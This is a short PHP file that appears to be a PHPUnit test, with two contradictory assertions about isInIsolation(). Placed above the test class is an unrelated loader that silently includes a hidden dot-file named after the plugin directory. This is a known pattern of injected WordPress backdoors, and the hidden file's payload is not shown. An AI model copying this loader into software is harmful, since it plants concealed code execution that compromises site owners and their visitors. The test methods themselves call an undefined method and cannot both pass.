<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class IsolationTest extends PHPUnit_Framework_TestCase
{
    public function testIsInIsolationReturnsFalse()
    {
        $this->assertFalse($this->isInIsolation());
    }

    public function testIsInIsolationReturnsTrue()
    {
        $this->assertTrue($this->isInIsolation());
    }
}
